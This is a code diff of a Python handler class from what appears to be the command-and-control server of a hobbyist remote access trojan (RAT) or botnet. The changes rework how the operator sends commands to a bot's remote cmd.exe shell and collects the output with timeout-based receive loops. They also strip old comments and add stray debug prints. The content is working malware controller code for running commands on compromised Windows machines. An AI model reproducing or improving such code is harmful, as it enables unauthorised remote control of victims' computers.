@@ -8,12 +8,6 @@ import threading
 import queue
 import time
 
-# Project imports
-# import server
-# import interpreter
-# from server import batchList, aliveConnections, deadConnections, clientAddressList
-# from interpreter import Interpreter
-
 class Handler(threading.Thread):
 
     def __init__(self, client, client_address, bot_id):
@@ -26,16 +20,20 @@ class Handler(threading.Thread):
         self.info = [self.bot_id,self.ip,self.port]
         self.status = "ALIVE"
 
-        self.respQueue = queue.Queue()
-        self.cmdQueue = queue.Queue()
-        # self.agentList = agentList
+        # self.respQueue = queue.Queue()
+        # self.cmdQueue = queue.Queue()
 
-    # Look at advantages and disadvantages of using seperate queues for each handler. 
+    # Look at advantages and disadvantages of using seperate queues for each handler. - NIX'D}
     #   - They can be initialized in the class itself, rather than in the Server or Interpreter class
     #   - Look at implementing all Agent functions within the Interpreter class. Consider the example 
     #       and think about how shifting all of these functions will make a difference in cleanliness.
     #       It will require the extensive use of queues to pass back information, as the Agent thread
-    #       will continually use it the catch and execute commands. Think, Josh. Think...
+    #       will continually use it the catch and execute commands. Think...
+    #   + Decision on Queues: Don't pursue. Sequential receiving isn't such a bad thing. Where we truly 
+    #       run into a problem is when we're receiving information that may overflow or hit a timeout.
+    #       
+    #       As such, we should take the idea of looping-recv, with timeouts, but give enough time to 
+    #       realize that connections suck. 
 
 
     def run(self):
@@ -109,7 +107,7 @@ class Handler(threading.Thread):
         #   Data from cmd.exe shell is hanging. I have to initially receive the welcome-msg twice (once for the Microsoft 
         #   banner and another for the initial shell/cwd output prompt).
         
-        # Problem solved. The commands no longer hang, but 
+        # Problem solved. The commands no longer hang, but sequences suck
 
         # Initiate shell 
         try:
@@ -119,10 +117,6 @@ class Handler(threading.Thread):
             print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
             return False                            # unsuccessful
         else:
-            # recvVal = self.client.recv(2048)        # Receive reply from RAT
-            # print(recvVal)
-
-            # Banner grabbing for cmd.exe - cred to dtrizna
             banner = ""
             while True:
                 try:
@@ -136,39 +130,88 @@ class Handler(threading.Thread):
                     banner += recv
             if banner:
                 print(banner)
-            time.sleep(0.5)
+        
+        time.sleep(0.5)
 
         while (True):                                                           # Capture IO sent over socket (cmd.exe)
             try:
-                cmd = input()                                            # Dumb capture in
+                cmd_sent = input()                                            # Dumb capture in
+                cmd_sent += "\n"
             except Exception as ex:
                 print(f"[* BotHandler-Msg:ShellExec] Unable to parse command")  # Error recived? pass
                 print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
             else:
                 try:
-                    if(cmd.casefold() == 'quit' or cmd.casefold() == 'exit'):
-                        self.client.send("exit\n".encode('utf-8'))
-                        print(f"[* BotHandler-Msg:ShellExec] Exiting. Please wait...")
-                        time.sleep(1.3)
-                        # self.client.send("exit\n".encode('utf-8'))
-                        # time.sleep(0.3)
-                        recvVal = ((self.client.recv(2048)).decode('utf-8'))
-                        print(recvVal.strip("\n"))
-                        break
+                    cmd_response = ""
+                    shell_exit = False
+                    if(cmd_sent.casefold() == 'quit\n' or cmd_sent.casefold() == 'exit\n'):
+                        print(f"[* BotHandler-Msg:ShellExec] Sending EXIT signal to Agent. Please wait...")
+                        self.client.send(("exit\n").encode('utf-8'))
+
+                        while(True):
+
+                            self.client.settimeout(0.5)
+
+                            try:
+                                recv = self.client.recv(4096).decode('utf-8')
+
+                            except socket.timeout:
+                                # if timeout exception is triggered - assume no data anymore
+                                recv = ""
+                            except Exception as ex:
+                                print("[* BotHandler-Msg:ShellExec] Unable to process received data.")
+                                print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
+                                break
+
+                            if not recv:
+                                break
+                            
+                            else:
+                                cmd_response += recv  
+                        
+                        print("yo1")
+                        shell_exit = True
+
                     else:
-                        self.client.send((cmd+"\n").encode('utf-8'))                        # Encode input then send
-                        # print(f"--data being sent = {cmd}")                               # ping for send stage
+                        self.client.send((cmd_sent).encode('utf-8'))
+
+                        while(True):
+                            try:
+                                if (cmd_sent.casefold() == "\n"):
+                                    self.client.settimeout(0.5)
+                                elif (len(cmd_response) <= len(cmd_sent)):
+                                    self.client.settimeout(5)
+                                else:
+                                    self.client.settimeout(1)
+                                    
+                                recv = self.client.recv(4096).decode('utf-8')
+
+                            except socket.timeout:
+                                # if timeout exception is triggered - assume no data anymore
+                                recv = ""
+                            except Exception as ex:
+                                print("[* BotHandler-Msg:ShellExec] Unable to process received data.")
+                                print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
+                                break
+
+                            if not recv:
+                                break
+                            
+                            else:
+                                cmd_response += recv
+                    
                 except Exception as ex:
                     print(f"[* BotHandler-Msg:ShellExec] Unable to send command to bot {self.bot_id} at {str(self.ip)}")        #Error Received? pass
                     print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
                 else:
-                    # print("--reached receive--") 
-                    time.sleep(0.3)                                                         # ping for recv stage
-                    recvVal = ((self.client.recv(2048)).decode('utf-8'))       # Receive reply from RAT
-                    # print("--printing recv--")                                            # ping for non-hanging return
-                    print(recvVal.strip("\n"))                                                          # content-received
-
-            # print("==exiting loop iteration==")                                 # ping for iterative finish
+                    
+                    if len(cmd_response.strip()) > 1:
+                        # Removing sent command from response before printing output
+                        print(cmd_response.replace(cmd_sent,""))
+            
+                    if(shell_exit):
+                        print("yo")
+                        break
 
         print(f"[* BotHandler-Msg:ShellExec] Exiting interaction with Bot #{self.bot_id} at {str(self.ip)}")
         return True
